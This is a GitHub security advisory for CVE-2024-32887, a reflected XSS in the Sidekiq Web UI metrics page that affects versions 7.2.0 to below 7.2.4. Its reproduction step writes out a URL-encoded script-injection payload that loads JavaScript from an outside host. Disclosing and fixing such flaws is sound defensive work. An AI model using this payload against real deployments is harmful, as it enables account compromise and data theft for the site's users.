# [M] Sidekiq vulnerable to a Reflected XSS in Queues Web Page

## Summary
Severity: Medium
Advisory: GHSA-q655-3pj8-9fxq
CVE: CVE-2024-32887
CWE: CWE-79
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2024-04-26
Source: https://github.com/advisories/GHSA-q655-3pj8-9fxq
Type: github-advisory

## Affected
- RubyGems: `sidekiq` — affected >=7.2.0 <7.2.4

## Details
### Description:
During the source Code Review of the metrics.erb view of the Sidekiq Web UI, A reflected XSS vulnerability is discovered. The value of substr parameter is reflected in the response without any encoding, allowing an attacker to inject Javascript code into the response of the application. 

This vulnerability can be exploited to target the users of the application, and users of other applications deployed on the same domain or website as that of the Sidekiq website. Successful exploit results may result in compromise of user accounts and user data.

### Impact:
The impact of this vulnerability can be severe. An attacker could exploit it to target users of the Sidekiq Web UI. Moreover, if other applications are deployed on the same domain or website as Sidekiq, users of those applications could also be affected, leading to a broader scope of compromise. Potentially compromising their accounts, forcing the users to perform sensitive actions, stealing sensitive data, performing CORS attacks, defacement of the web application, etc.

### Mitigation:
Encode all output data before rendering it in the response to prevent XSS attacks.

### Steps to Reproduce:
1. Go to the following URL of the sidekiq Web UI: 
https://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22https://cheemahq.vercel.app/a.js%22%20/%3E
2. XSS payload will be executed, causing a popup.

### Evidence:

![image](https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e)
Figure 1: Source Code Vulnerable to XSS

![image](https://github.com/sidekiq/sidekiq/assets/59286712/7a801feb-d495-416e-8e0e-36dee0eadf85)
Figure 2: XSS payload triggered

## References
- https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq
- https://nvd.nist.gov/vuln/detail/CVE-2024-32887
- https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2024-32887.yml
- https://github.com/sidekiq/sidekiq
- https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4
